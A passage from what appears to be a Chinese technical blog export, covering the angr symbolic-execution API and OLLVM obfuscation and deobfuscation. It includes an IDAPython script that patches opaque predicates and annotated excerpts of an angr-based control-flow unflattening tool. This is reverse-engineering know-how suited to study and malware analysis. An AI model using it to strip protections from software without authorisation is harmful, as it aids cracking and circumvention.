时，会执行 这个函数，同时把 当前的 state 对象作为参数传递过去 length 为 待 hook 指令的长度，在 执行完 hook 函数以后，angr 需要根据 length 来跳过这条指令，执行下一条指令 优化： simgr.one_active.options.add(angr.options.LAZY_SOLVES) 对simgr开启LAZY_SOLVES选项，该选项可不在运行时实时检查当前条件能否到达目标位置。虽然这样无法规避一些无解的情况，但可以显著提高效率 12345678910111213141516#!/usr/bin/env python# coding=utf-8import angrimport claripydef hook_demo(state): state.regs.eax = 0 state.regs.ebx = 0xdeadbeefp = angr.Project(&quot;./examples/sym-write/issue&quot;, load_options=&#123;&quot;auto_load_libs&quot;: False&#125;)p.hook(addr=0x08048485, hook=hook_demo, length=2) # 使用 p.hook 把 0x08048485 处的 2 字节的指令 为 hook_demo，之后执行 0x08048485就会去执行 hook_demostate = p.factory.blank_state(addr=0x0804846B, add_options=&#123;&quot;SYMBOLIC_WRITE_ADDRESSES&quot;&#125;)#创建一个 state , 因为要往内存里面设置 符号量 （ BVS ），设置SYMBOLIC_WRITE_ADDRESSESu = claripy.BVS(&quot;u&quot;, 8)state.memory.store(0x0804A021, u) #新建一个 8 位长度的符号量，并把它存到 0x0804A021 (全局变量 u 的位置)sm = p.factory.simgr(state)sm.explore(find=0x080484DB)st = sm.found[0]print hex(st.se.eval(st.regs.ebx)) SimFile和SimPackets API 函数 功能描述 示例代码 常见场景 angr.SimFile(name, content, size) 创建一个模拟文件（SimFile），可以包含具体值或符号变量内容，并指定大小。 import angr, claripy sim_file = angr.SimFile(&#39;a_file&#39;, content=&quot;flag&#123;F4k3_f1@9!&#125;\\n&quot;) bvs = claripy.BVS(&#39;bvs&#39;, 64) sim_file2 = angr.SimFile(&#39;another_file&#39;, bvs, size=8) 用于创建模拟文件，进行符号执行时模拟文件内容的读取、写入等操作。 state.fs.insert(name, sim_file) 将 SimFile 插入到当前状态的文件系统中。 state.fs.insert(&#39;test_file&#39;, sim_file) 将模拟文件插入到符号执行的文件系统，模拟程序与文件系统的交互。 sim_file.read(pos, size) 从模拟文件中读取数据，返回数据、实际读取的字节数以及新的位置。 pos = 0 data, actual_read, pos = sim_file.read(pos, 0x100) 模拟文件的读取操作，用于获取文件内容。 sim_file.write(pos, data) 将数据写入模拟文件的指定位置。 pos = 0 sim_file.write(pos, b&#39;new_data&#39;) 用于模拟文件的写操作。 sim_file.set_state(state) 将模拟文件与给定的状态关联，指定哪个状态拥有该文件的内容。 sim_file.set_state(state) 将模拟文件与某个特定状态进行关联，确保文件在符号执行过程中的状态同步。 angr.SimPackets(name) 创建一个模拟数据包流（SimPackets），用于模拟与流相关的文件或网络通信。 sim_packet = angr.SimPackets(&#39;my_packet&#39;) 用于模拟流数据（如 TCP 连接、标准 IO 等），帮助处理符号执行中的流操作。 sim_packet.read(pos, size) 从模拟数据包流中读取指定位置的数据。 sim_packet.read(pos, size) 用于模拟读取流数据，常用于模拟网络数据流或 I&#x2F;O 操作中的流数据。 sim_packet.write(pos, data) 将数据写入模拟数据包流的指定位置。 sim_packet.write(pos, b&#39;new_packet_data&#39;) 用于模拟写入流数据，通常应用于网络协议或 I&#x2F;O 操作中。 state.fs.get(filename) 获取当前状态下文件系统中指定文件名的模拟文件对象。 sim_file = state.fs.get(&#39;test_file&#39;) 获取已插入的模拟文件，用于进一步的读取、写入等操作。 state.fs.remove(filename) 从当前状态下的文件系统中删除指定文件。 state.fs.remove(&#39;test_file&#39;) 删除文件系统中的模拟文件，常用于清理操作或修改执行路径。 sim_file.size 获取模拟文件的大小。 file_size = sim_file.size 获取模拟文件的大小，在处理文件时非常有用，特别是符号执行中需要知道文件大小的场景。 sim_file.seek(pos) 设置模拟文件的读写位置。 sim_file.seek(0x100) 用于在文件中移动读写位置，类似于传统文件操作中的 seek 函数。 SimProcedureangr.SimProcedure 类是 angr 提供的一个用于模拟程序中的函数过程的类，它可以用来模拟文件中的某些函数的行为，尤其是在符号执行过程中。通过继承并重写 SimProcedure 类的 run() 方法，用户可以定义自定义的函数行为，这对于替换或模拟二进制程序中调用的特定函数非常有用 SimProcedure 主要 API 函数表格 API 函数 功能描述 示例代码 常见场景 SimProcedure.run(*args) 模拟目标函数的行为，必须重写此方法。参数是目标函数的输入。 class MyProcedure(angr.SimProcedure): def run(self, arg1, arg2): return self.state.memory.load(arg1, arg2) 用于定义目标函数的模拟逻辑，模拟函数的行为。 SimProcedure.ret(expr) 模拟函数的返回操作，expr 为返回的值。 self.ret(result) 在自定义函数的 run() 方法中模拟函数的返回。 SimProcedure.jump(addr) 模拟跳转到指定地址。 self.jump(0x400080) 模拟函数内的跳转，改变程序的执行流。 SimProcedure.exit(code) 模拟程序的退出操作，code 为退出码。 self.exit(0) 模拟程序退出的场景。 SimProcedure.call(addr, args, continue_at) 模拟函数调用，addr 是函数的地址，args 是参数，continue_at 是执行的下一地址。 self.call(0x400080, [arg1, arg2], continue_at=0x400100) 在自定义函数中模拟对其他函数的调用。 SimProcedure.inline_call(procedure, *args) 内联调用另一个 SimProcedure。 self.inline_call(AnotherProcedure(), arg1, arg2) 在当前函数内联调用另一个函数，模拟多个函数交互。 Stash在 angr 中，Stash 是一种状态分类机制，用于将不同类型的符号执行状态组织到 SimulationManager 的不同列表中，以便进行有针对性的分析。每种 Stash 都表示一种特定的状态集合，并支持对状态的筛选、转移、合并、步进等操作。这种设计提高了符号执行的灵活性和效率。 常见的 Stash 类型 Stash 名称 描述 典型用途 active 活跃的状态列表，表示当前正在执行的状态。 默认执行的状态集，用于继续符号执行流程。 deadended 死亡的状态列表。当一个状态无法继续执行时（如无有效指令、无效指针或约束不满足），会归入此列表。 分析状态终止原因，例如检测路径的结束条件。 pruned 被剪枝的状态列表。启用 LAZY_SOLVES 时，发现某状态不可满足（unsat），会剪枝到其历史的根源状态，将其及其后代放入此列表。 优化符号执行，减少无效路径，提高效率。 unconstrained 不受约束的状态列表。如果 SimulationManager 创建时指定 save_unconstrained=True，则由符号化数据控制指针的状态会归入此列表。 分析不受约束的路径，例如利用程序漏洞导致的任意代码执行。 unsat 不可满足的状态列表。当指定 save_unsat=True 时，冲突约束导致的不可满足状态（例如输入同时为 “AAAA” 和 “BBBB”）会归入此列表。 发现和分析不可达路径或逻辑冲突。 errored 错误状态列表。状态在执行时发生错误时，状态及其错误会被封装为 ErrorRecord 并放入此列表。 调试错误状态，检查程序模拟的异常行为。 Stash 操作 函数 描述 示例代码 用途 move(from_stash, to_stash) 在不同的 Stash 之间移动状态。 simgr.move(from_stash=&#39;unconstrained&#39;, to_stash=&#39;active&#39;) 将不受约束的状态重新激活，进行进一步的符号执行。 move(..., filter_func=func) 通过指定的过滤函数筛选后再移动状态。 def filter(state): return b&quot;key&quot; in state.posix.dumps(1) simgr.move(..., filter_func=filter) 提取符合条件的状态（例如包含特定输出），便于后续分析。 step(stash) 对指定的 Stash 中的状态执行一步符号执行操作。 simgr.step(stash=&#39;active&#39;) 控制特定状态集的步进执行。 split(func) 按给定条件将 Stash 中的状态划分为多个组。 simgr.split(lambda s: s.satisfiable()) 对状态按约束可满足性等条件进行分类。 prune() 清除特定的 Stash 中的状态以优化资源使用。 simgr.prune(stash=&#39;unsat&#39;) 删除不可满足的状态，提升执行效率。 drop(stash) 删除整个 Stash 的所有状态。 simgr.drop(&#39;pruned&#39;) 清理不需要的状态集，释放内存资源。 stashes 返回所有 Stash 的字典。 stashes = simgr.stashes 查看当前 SimulationManager 管理的所有状态分类。","categories":[],"tags":[],"keywords":[]},{"title":"OLLVM反混淆","slug":"OLLVM反混淆","date":"2024-12-04T11:33:27.000Z","updated":"2024-12-11T12:19:38.124Z","comments":true,"path":"2024/12/04/OLLVM反混淆/","link":"","permalink":"http://example.com/2024/12/04/OLLVM%E5%8F%8D%E6%B7%B7%E6%B7%86/","excerpt":"","text":"去指令替换混淆LLVM 提供了一些优化 Pass，可以用于简化和优化编译后的 IR（中间表示）代码，去除无意义的混淆指令。尤其是使用 llvm-dis 反汇编指令后，我们可以通过 opt 工具结合 -O3 优化级别来简化程序。此方法的核心思想是利用 LLVM 编译工具链中内置的优化技术，自动剖析和去除冗余的指令替换。 或者使用Miasm框架进行匹配，然后优化处理即可。Miasm 是一个专注于逆向工程的框架，它允许研究人员进行二进制分析、控制流恢复和混淆去除。Miasm 通过模拟二进制代码的执行，自动化地识别程序中的混淆模式，并通过去除冗余指令来简化程序。它尤其适用于静态分析与指令替换的混淆。 反字符串加密字符串加密的的常规解决方式： （1）特征搜索 思路： 在很多使用字符串加密的二进制中，会存在一个解密函数，例如 datadiv_decode 或其他命名类似的函数。这些解密函数通常通过某种算法（如异或、加法等）将加密的字符串还原成明文。 通过在二进制中搜索特定的解密函数，可以快速定位到解密的逻辑。 （2）init_array中解密 在某些情况下，程序可能会在 init_array 中进行字符串解密。init_array 是在程序启动时执行的代码区域，通常用于初始化操作。在 OLLVM 混淆中，解密可能发生在此区域中。 思路： init_array 中的解密操作在程序启动时执行，因此通过模拟程序启动过程，可以将解密后的字符串提取出来。 可以通过动态分析工具或模拟执行来查看该区域的解密过程，并获取解密后的字符串。 （3）jni_onload解密 jni_onload 是 JNI（Java Native Interface）中的一个特殊函数，通常会在 JNI 库加载时被调用。在 OLLVM 中，字符串解密操作有时会放在 jni_onload 中进行。 思路： 在 JNI 库加载时，解密操作可能会在 jni_onload 函数中执行，通常是为了准备一些加密数据供 Java 层使用。 可以通过 hook jni_onload 函数，或者使用 Unicorn 模拟执行，从中获取解密后的字符串。 反虚假控制流虚假控制流去除的思路一般为除去不可达块和不透明谓词。但是难点在于不透明谓词，现在不透明谓词的研究不断发展，有永真&#x2F;永假型不透明谓词，也有可真可假型不透明谓词。当然针对复杂的虚假控制流，在反混淆过程中还需要考虑死循环等问题 不透明谓词： 12永真/假型：插入的后续基本块中必有一个不被执行可真可假型：插入的两个后继基本块的语义应相同 针对简单的控制流混淆，去不透明谓词的思想主要是： 123（1）不直接处理不透明谓词，通过让不透明谓词的变量地址可读，则IDA便可以优化（2）直接将不透明谓词赋值为0或者将不透明谓词中变量x，y赋值为0（3）编译器优化去干掉不透明谓词 不可达块： 不可达块是指控制流永远无法到达的基本块，一般我们可以使用符号执行或模拟执行来除去不可达基本块 idapython脚本; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytesfrom ida_segment import get_segm_by_name# 将 mov 寄存器, 不透明谓词 修改为 mov 寄存器, 0def do_patch(ea): &quot;&quot;&quot; 检查并替换不透明谓词的 mov 操作，将其替换为 mov 寄存器, 0 &quot;&quot;&quot; # 获取指令字节 opcode = get_bytes(ea, 1) # 判断是否为 mov 寄存器, [寄存器/内存] 指令 (例如 mov eax, edi) if opcode == b&quot;\\x8B&quot;: # 获取目标寄存器 reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) &gt;&gt; 3 # 将原始的 mov 指令替换为 mov 寄存器, 0 (即 mov eax, 0) patch_bytes(ea, (0xB8 + reg).to_bytes(1, &#x27;little&#x27;) + b&#x27;\\x00\\x00\\x00\\x00\\x90&#x27;) else: print(f&quot;Unsupported instruction at &#123;hex(ea)&#125;&quot;)def get_bss_segment(): &quot;&quot;&quot; 获取 BSS 段的地址范围 &quot;&quot;&quot; seg = get_segm_by_name(&#x27;.bss&#x27;) if seg is None: print(&quot;BSS segment not found.&quot;) return None, None return seg.start_ea, seg.end_eadef patch_control_flow(start, end): &quot;&quot;&quot; 对指定的地址范围内的虚假控制流进行修复 &quot;&quot;&quot; for addr in range(start, end, 4): # 获取所有对该地址的交叉引用 ref = ida_xref.get_first_dref_to(addr) print(f&quot;Processing references for address &#123;hex(addr)&#125;&quot;.center(40, &#x27;-&#x27;)) # 遍历所有交叉引用 while ref != ida_idaapi.BADADDR: print(f&quot;Patch reference at &#123;hex(ref)&#125;&quot;) do_patch(ref) ref = ida_xref.get_next_dref_to(addr, ref) print(&#x27;-&#x27; * 40)def main(): # 获取 .bss 段的地址范围 start, end = get_bss_segment() if start is None or end is None: return # 如果找不到 .bss 段则退出 # 对虚假控制流进行修复 patch_control_flow(start, end)if __name__ == &quot;__main__&quot;: main() 反控制流平坦化 其代码的真实逻辑在：序言块、真实块（相关块）、retn块中。 反控制流平坦化的核心在于准确区分真实块与分发器，并恢复真实块的顺序。通过特征匹配与动态执行相结合，可以高效完成大多数情况的去混淆工作。修补过程中优先使用简单的跳转逻辑，必要时对函数进行整体重构，以最大限度恢复代码的可读性和逻辑完整性。 一般通用的反控制流平坦化思路： （1）先保存所有的基本块（2）区分真实块和分发器（虚假块） 一般通过规则匹配来做，但是并无法使用所有情况 （难点）（3）连接真实块的顺序 一般静态可以通过IDA trace然后编写IDApython脚本，动态可以通过符号执行、模拟执行（4）编写patch修复 对目标函数进行修复、恢复原始逻辑 保存所有的基本块控制流平坦化将代码逻辑碎片化，因此反混淆的首要任务是提取所有的基本块： 基本原理： 控制流平坦化重构执行流为三类链： 入口链（Prologue Chain）： 原始函数的入口到主分发器的路径。 循环链（Loop Chain）： 主分发器之间的循环跳转路径。 返回链（Return Chain）： 主分发器到函数结束的路径。 操作： 通过静态分析工具（如 IDA Pro）或动态分析工具（如调试器）提取目标函数的所有基本块，并初步分类。重点关注分发器（Dispatcher）的识别（详见第 2 步）。 区分真实块和分发器分发器是控制流平坦化的核心逻辑节点，其作用是引导流程跳转到下一个基本块。区分真实块与分发器的关键如下： 分发器的特征： 引用次数较高： 分发器是执行链的核心节点，其引用次数远高于其他基本块。 结构固定： 分发器通常包含跳转逻辑，如 switch-case 或复杂的 if-else。 真实块的特征： 内存操作： 包含内存访问指令（如 ldr, str）。 函数调用： 出现 bl 或 blx 指令。 确定性跳转： 出现明确的条件跳转指令（如 beq, bne）。 方法： 遍历函数的所有基本块，统计每个块的引用次数。 通过特征匹配（如常用指令模式）识别真实块和分发器。 连接真实块的顺序重建真实块的顺序是反控制流平坦化的核心 静态方法： 使用 IDA Pro 的 Trace 功能获取执行路径。 编写 IDAPython 脚本解析每个基本块的连接关系。 判断分支条件，重建代码逻辑。 动态方法： 使用符号执行工具（如 angr）模拟执行代码。 跟踪每条路径的执行结果。 遇到复杂分支时，结合人工分析调整路径。 特殊情况处理： 对于真实块包含双路径（movwne/movtne r1）的情况，需要分别处理两条路径并连接至对应的真实块。 编写patch修补代码是反混淆的最后一步，以下是两种主要方法： 方法一：直接 Patch 清理无用块： 将分发器或虚假块替换为 NOP 指令。 修补无分支块： 将真实块的最后一条指令改为无条件跳转（jmp）到下一个真实块。 修补分支块： 将条件跳转指令（如 cmovz）替换为明确的条件跳转（如 jz），并添加无条件跳转指令跳向另一分支。 优点： 简单直接，适合快速恢复代码。 缺点： 适用性有限，对复杂分支结构支持较弱。 方法二：重构函数逻辑 提取所有真实块的指令，并根据其关系重新排列。 计算每个真实块的相对偏移，生成新的函数代码。 替换混淆后的目标函数。 优点： 适用性广，适合复杂函数。 缺点： 工作量大，依赖精确分析。 基于angr的脚本学习：cq674350529&#x2F;deflat: use angr to deobfuscation deflt.pyget_relevant_nop_nodes 函数从一个超级控制流图（supergraph）中提取： 相关节点（relevant_nodes）： 与主要分发节点（pre_dispatcher_node）相连并且逻辑上有用的节点。 NOP 节点（nop_nodes）： 与程序主逻辑无关，可能是填充代码或冗余的节点。 12345678910111213def get_relevant_nop_nodes(supergraph, pre_dispatcher_node, prologue_node, retn_node): # relevant_nodes = list(supergraph.predecessors(pre_dispatcher_node)) relevant_nodes = [] nop_nodes = [] for node in supergraph.nodes(): if supergraph.has_edge(node, pre_dispatcher_node) and node.size &gt; 8: # XXX: use node.size is faster than to create a block relevant_nodes.append(node) continue if node.addr in (prologue_node.addr, retn_node.addr, pre_dispatcher_node.addr): continue nop_nodes.append(node) return relevant_nodes, nop_nodes symbolic_execution 函数利用 angr 库进行符号执行（Symbolic Execution），分析程序的动态行为，目标是： 从给定起始地址（start_addr）开始，模拟执行程序的控制流。 判断当前路径是否到达指定的相关基本块地址列表（relevant_block_addrs）。 通过设置断点和hook，控制程序执行过程，并根据需求修改状态。 12345678910111213141516171819202122232425262728293031323334def symbolic_execution(project, relevant_block_addrs, start_addr, hook_addrs=None, modify_value=None, inspect=False): #模拟返回（retn）过程：当程序执行到特定hook地址时，调用此函数移除hook，模拟程序返回逻辑。 def retn_procedure(state): ip = state.solver.eval(state.regs.ip) project.unhook(ip) return #在执行指定语句前检查当前语句的表达式：如果表达式是条件语句，则修改条件值为 modify_value。修改后移除断点（避免重复触发）。 def statement_inspect(state): expressions = list(state.scratch.irsb.statements[state.inspect.statement].expressions) if len(expressions) != 0 and isinstance(expressions[0], pyvex.expr.ITE): state.scratch.temps[expressions[0].cond.tmp] = modify_value state.inspect._breakpoints[&#x27;statement&#x27;] = [] #如果提供了 hook_addrs，为这些地址设置hook：hook函数为 retn_procedure，模拟返回逻辑。根据架构调整钩子覆盖指令的长度。 if hook_addrs is not None: skip_length = 4 if project.arch.name in ARCH_X86: skip_length = 5 for hook_addr in hook_addrs: project.hook(hook_addr, retn_procedure, length=skip_length)#创建一个空白状态，从指定的 start_addr 开始执行。 state = project.factory.blank_state(addr=start_addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;) if inspect:#如果启用了 inspect，在语句执行前设置断点，执行 statement_inspect。 state.inspect.b(&#x27;statement&#x27;, when=angr.state_plugins.inspect.BP_BEFORE, action=statement_inspect) #每次执行一个步骤。检查当前活跃状态的地址是否在 relevant_block_addrs 列表中：如果是，则返回该地址。否则继续执行下一步，直到没有活跃状态为止。 sm = project.factory.simulation_manager(state) sm.step() while len(sm.active) &gt; 0: for active_state in sm.active: if active_state.addr in relevant_block_addrs: return active_state.addr sm.step() return None 创建 angr 项目对象，加载二进制文件。 使用 CFGFast 构建快速控制流图（CFG），启用 normalize 以避免基本块重叠。 1234project = angr.Project(filename, load_options=&#123;&#x27;auto_load_libs&#x27;: False&#125;)cfg = project.analyses.CFGFast(normalize=True, force_complete_scan=False)#对二进制文件的基地址（mapped base）向下对齐到 4KB（页面大小）的整数倍。base_addr = project.loader.main_object.mapped_base &gt;&gt; 12 &lt;&lt; 12 123456789101112131415161718192021222324252627282930 # 从控制流图中查找目标函数。 target_function = cfg.functions.get(start) #如果未找到目标函数，则通过基地址调整后重新查找。 if target_function is None: target_function = cfg.kb.functions.get_by_addr(base_addr + start) # 将函数的转换图转换为“超级图” supergraph = am_graph.to_supergraph(target_function.transition_graph) # 入口节点提取：入度为零的节点被认为是函数的入口节点 prologue_node = None for node in supergraph.nodes(): if supergraph.in_degree(node) == 0: prologue_node = node # Return 结点：出度为零且没有后续分支的节点被认为是返回节点。 if supergraph.out_degree(node) == 0 and len(node.out_branches) == 0: retn_node = node #校验入口节点，确保入口节点地址与用户指定的起始地址匹配。 if prologue_node is None or prologue_node.addr not in [start, base_addr + start]: print(&quot;Something must be wrong...&quot;) sys.exit(-1) #主分发节点结点提取：入口节点的第一个后继节点通常是主分发节点。 main_dispatcher_node = list(supergraph.successors(prologue_node))[0] #前序分发节点提取：主分发节点的前序节点中，地址与入口节点不同的节点是前序分发节点。 for node in supergraph.predecessors(main_dispatcher_node): if node.addr != prologue_node.addr: pre_dispatcher_node = node break#relevant_nodes: 与控制流分析相关的基本块集合。nop_nodes: 可能的无操作（NOP）指令集合，用于混淆分析或补丁检测。 relevant_nodes, nop_nodes = get_relevant_nop_nodes(supergraph, pre_dispatcher_node, prologue_node, retn_node) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546relevants = relevant_nodesrelevants.append(prologue_node)relevants_without_retn = list(relevants)relevants.append(retn_node)relevant_block_addrs.extend([prologue_node.addr, retn_node.addr])flow = defaultdict(list)patch_instrs = &#123;&#125;for relevant in relevants_without_retn: print(&#x27;-------------------dse %#x---------------------&#x27; % relevant.addr) block = project.factory.block(relevant.addr, size=relevant.size) has_branches = False hook_addrs = set([]) for ins in block.capstone.insns: ... elif project.arch.name in ARCH_ARM: if ins.insn.mnemonic != &#x27;mov&#x27; and ins.insn.mnemonic.startswith(&#x27;mov&#x27;): if relevant not in patch_instrs: patch_instrs[relevant] = ins has_branches = True elif ins.insn.mnemonic in &#123;&#x27;bl&#x27;, &#x27;blx&#x27;&#125;:#记录函数调用地址 hook_addrs.add(ins.insn.address) elif project.arch.name in ARCH_ARM64: if ins.insn.mnemonic.startswith(&#x27;cset&#x27;):#条件设置指令 if relevant not in patch_instrs: patch_instrs[relevant] = ins has_branches = True elif ins.insn.mnemonic in &#123;&#x27;bl&#x27;, &#x27;blr&#x27;&#125;:#函数调用 hook_addrs.add(ins.insn.address) #如果当前块包含条件分支，进行两次符号执行： #条件为真（claripy.BVV(1, 1)）。 #条件为假（claripy.BVV(0, 1)）。 #对于每次执行，返回的后续地址（tmp_addr）记录在 flow 中 if has_branches: tmp_addr = symbolic_execution(project, relevant_block_addrs,relevant.addr, hook_addrs, claripy.BVV(1, 1), True) if tmp_addr is not None: flow[relevant].append(tmp_addr) tmp_addr = symbolic_execution(project, relevant_block_addrs,relevant.addr, hook_addrs, claripy.BVV(0, 1), True) if tmp_addr is not None: flow[relevant].append(tmp_addr) #对无分支块，直接执行一次符号执行，记录后续地址。 else: tmp_addr = symbolic_execution(project, relevant_block_addrs,relevant.addr, hook_addrs) if tmp_addr is not None: flow[relevant].append(tmp_addr) patch 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#填充无操作指令（NOP），移除不必要的代码块。for nop_node in nop_nodes: fill_nop(origin_data, project.loader.main_object.addr_to_offset(nop_node.addr), nop_node.size, project.arch)# remove unnecessary control flowsfor parent, childs in flow.items(): #将代码块的最后一条指令替换为无条件跳转指令b if len(childs) == 1: parent_block = project.factory.block(parent.addr, size=parent.size) #使用 capstone 提取最后一条指令。 last_instr = parent_block.capstone.insns[-1] #将文件偏移量 定位到最后一条指令的位置。 file_offset = project.loader.main_object.addr_to_offset(last_instr.address) # ... elif project.arch.name in ARCH_ARM64: #若代码块为起始块，跳过 4 字节 if parent.addr in [start, base_addr + start]: file_offset += 4 patch_value = ins_b_jmp_hex_arm64(last_instr.address+4, childs[0], &#x27;b&#x27;) else: patch_value = ins_b_jmp_hex_arm64(last_instr.address, childs[0], &#x27;b&#x27;) #若架构为大端模式（Iend_BE），对指令字节码进行字节序反转。 if project.arch.memory_endness == &quot;Iend_BE&quot;: patch_value = patch_value[::-1] patch_instruction(origin_data, file_offset, patch_value) #根据条件，生成多个跳转指令（如条件跳转 jx 和无条件跳转 jmp），重构分支逻辑 else: instr = patch_instrs[parent] file_offset = project.loader.main_object.addr_to_offset(instr.address) # 移除从 cmovx 指令开始到块结束的原始指令内容 block_end_offset = project.loader.main_object.addr_to_offset(parent.addr + parent.size) #使用 fill_nop 将目标指令范围内的内容替换为 NOP 指令 fill_nop(origin_data, file_offset, block_end_offset - file_offset, project.arch) #... elif project.arch.name in ARCH_ARM: #从 movx 指令生成条件跳转指令 bx_cond bx_cond = &#x27;b&#x27; + instr.mnemonic[len(&#x27;mov&#x27;):] patch_value = ins_b_jmp_hex_arm(instr.address, childs[0], bx_cond) #若为大端模式（Iend_BE），反转字节序。 if project.arch.memory_endness == &#x27;Iend_BE&#x27;: patch_value = patch_value[::-1] patch_instruction(origin_data, file_offset, patch_value) file_offset += 4## 下一条指令位置 # 在条件跳转之后添加无条件跳转，以确保控制流安全跳转到目标地址。 patch_value = ins_b_jmp_hex_arm(instr.address+4, childs[1], &#x27;b&#x27;) if project.arch.memory_endness == &#x27;Iend_BE&#x27;: patch_value = patch_value[::-1] patch_instruction(origin_data, file_offset, patch_value) elif project.arch.name in ARCH_ARM64: # 从 cset.xx 指令中提取条件操作符 bx_cond = instr.op_str.split(&#x27;,&#x27;)[-1].strip() #创建条件跳转指令的机器码 patch_value = ins_b_jmp_hex_arm64(instr.address, childs[0], bx_cond) if project.arch.memory_endness == &#x27;Iend_BE&#x27;: patch_value = patch_value[::-1] patch_instruction(origin_data, file_offset, patch_value) file_offset += 4 # 添加无条件跳转确保代码流逻辑完整。 patch_value = ins_b_jmp_hex_arm64(instr.address+4, childs[1], &#x27;b&#x27;) if project.arch.memory_endness == &#x27;Iend_BE&#x27;: patch_value = patch_value[::-1] patch_instruction(origin_data, file_offset, patch_value) 补充ollvm混淆的通用解决流程：IDApython脚本跟踪 （1）我们编写相应的IDApython脚本，可以去记录真实寄存器值的变化并记录地址 （2）开启IDA动态调试附加程序，并导入IDApython脚本 （3）触发断点，并开启trace指令跟踪（针对不同的OLLVM混淆可以开启不同级别的trace） （4）待脚本执行完毕，分析保存的相关文件 （5）分析参数寄存器的逻辑关系，并编写算法还原代码 ollvm混淆解决方案： 基于Unicorn的模拟执行 这里首先我收集大佬编写的三篇相关博客： （1）unidbg去对抗字符串混淆：AndroidNativeEmu和unidbg对抗ollvm的字符串混淆 | king的博客 （2）unidbg去除ollvm虚假控制流：使用unidbg去ollvm虚假分支反混淆 | king的博客 （3）unidbg还原控制流平坦化：使用unidbg还原标准ollvm的fla控制流程平坦化 | king的博客 简单总结一下核心思路： 字符串混淆： 在.init_array中使用解密函数对字符串进行还原。也就是说。当我们执行完.init_array后。就会将正常的字符串写入内存中。这时我们就得到了真正的字符串了 （1）需要监控内存的读写，模拟运行.init_array，这样发生的内存写入时，基本可以确定是字符串还原函数在写入恢复的字符串 （2）我们需要把所有真实字符串以及写入真实字符串的位置给保存下来 （3）使用脚本将我们的真实字符串再写回so中，写入的so就能直接在ida中打开就看到真实字符串了，保存的address是有一个基址的。 虚假控制流： 虚假分支的混淆会在增加大量的if else分支。增加静态分析的复杂度。但是实际在动态执行的时候。很多if else实际都是没有执行的。所以去掉虚假分支其实就是删除掉那些没有执行到的代码块。 还原： 那么我们只要知道目标函数中，哪些汇编代码执行了，并且记录下执行汇编的address。然后把这些汇编以外的代码全部标记为nop。然后再用ida反汇编看到的结果。就直接是去掉虚假分支的结果了。 （当然现在一些IDA的插件也可以支持去除虚假控制流了，就是利用IDAPython脚本实现） 控制流平坦化：通过符号执行、中间语言分析等方式获取真实块之间的关系 （1）找出所有真实块以及对应的汇编地址，标准的ollvm虚假块中一般只有简单的修改v6的值，其他的基本都是真实块 （2）找出所有真实块的地址后。接着就是顺着逻辑将他们全部串联起来。","categories":[],"tags":[],"keywords":[]},{"title":"OLLVM","slug":"OLLVM","date":"2024-11-30T08:42:08.000Z","updated":"2024-12-04T11:32:22.204Z","comments":true,"path":"2024/11/30/OLLVM/","link":"","permalink":"http://example.com/2024/11/30/OLLVM/","excerpt":"","text":"​ 神秘的ollvm，之前都是知其状，不知其所以然。 原理OLLVM 基于 LLVM 编译器框架，其工作原理是在程序编译的过程中插入特定的混淆变换。通过编写更加复杂的Pass，将代码复杂化，这样就达到了混淆的目的。 分类：字符串加密字符串加密是将源代码中的字符串数据（如常量字符串）进行加密，使得它们在二进制文件中存储时不再以明文形式出现。程序运行时，字符串需要经过解密才能被使用。编写一个pass将其中的字符串信息使用一些加密算法进行加密，然后特定的时间进行还原。 指令替换（Sub）指令混淆的目标是改变程序的机器指令，使其变得难以逆向理解。虽然指令混淆并不改变程序的语义，但它会使得生成的二进制文件变得更加复杂，从而增加逆向工程的难度。 实现细节： 替代常用指令：通过使用不常见的指令来代替常见的指令，从而使得反汇编后的代码难以理解。例如，使用 xor 指令代替 add 或 sub 引入无用指令：向代码中添加一些不影响程序结果的“垃圾”指令，使得程序的机器码变得更加复杂。例如，y&#x3D;x+1，替换成y&#x3D;x-2+3 虚假控制流（bcf）虚假控制流混淆的基本思想是通过改变程序的分支结构、控制流指令以及函数调用顺序等，来插入无意义的控制流，打乱程序的执行路径。 虚假控制流混淆主要通过加入包含不透明谓词的条件跳转和不可达的基本块，来干扰IDA的控制流分析和F5反汇编。 不透明谓词：在 OLLVM 中，不透明谓词是一种插入到程序中的伪条件（如 if 语句），这些条件没有任何实际的逻辑意义或者其结果对程序的行为没有任何影响。它们通常由一些随机或不相关的值计算得出，使得它们的真假分支无法被直接推测或静态分析。在跳转前就已经确定的不等式，但是IDA无法分析， 例如 12345if (3 % 2 == 0) &#123; // 执行一组操作&#125; else &#123; // 执行另一组操作&#125; 3 % 2 == 0这个式子是恒不成立的，因此这个判断只会执行else，就可以增加虚假控制流。 不透明谓词的基本类型： 永真型不透明谓词（Tautology） 定义：永真型谓词是那些始终为 true 的条件判断。换句话说，它们总是引导程序走到某个分支。 永假型不透明谓词（Contradiction） 定义：永假型谓词是那些始终为 false 的条件判断。它们创建了从不被执行的代码块。 可真可假型不透明谓词（Opaque Predicate） 定义：可真可假型谓词的结果由程序中的某些变量决定，但这些变量的值与程序的实际逻辑或输入无关。也就是说，这些谓词在某些情况下可能为真，某些情况下可能为假，但静态分析者无法知道这些条件何时为真，何时为假，因为它们可能依赖于随机数、外部环境、加密信息等。 12345if (rand() % 2 == 0) &#123; return 1; // 随机条件&#125; else &#123; return 0;&#125; 不可达基本块不可达基本块是控制流图中的那些基本块，它们的执行路径永远不会被激活，即使它们在代码中存在，也不被任何真实的执行路径覆盖。 不可达基本块的作用 增加程序复杂度：不可达基本块的插入通过增加无意义的代码，使得程序的控制流图变得更加复杂，从而增加了逆向工程的难度。 引导虚假路径：不可达基本块往往是由虚假控制流引入的，它们充当着“假”的执行路径，让攻击者无法准确判断哪些代码会被执行。 可真可假型不透明谓词+不可达基本快 控制流平坦化（Fla）其基本思想是通过引入一个主分发器来控制程序基本块（basic block）之间的执行顺序，并通过复杂的跳转逻辑隐藏原有的控制流结构，从而使得程序的执行流程更加难以理解。 该方法将所有基本代码放到控制流最底部，然后删除原理基本块之间跳转关系，添加次分发器来控制分发逻辑，然后过新的复杂分发逻辑还原原来程序块之间的逻辑关系。 基本流程：添加一个随机数种子 blockID 在开始控制流平坦化之前，OLLVM 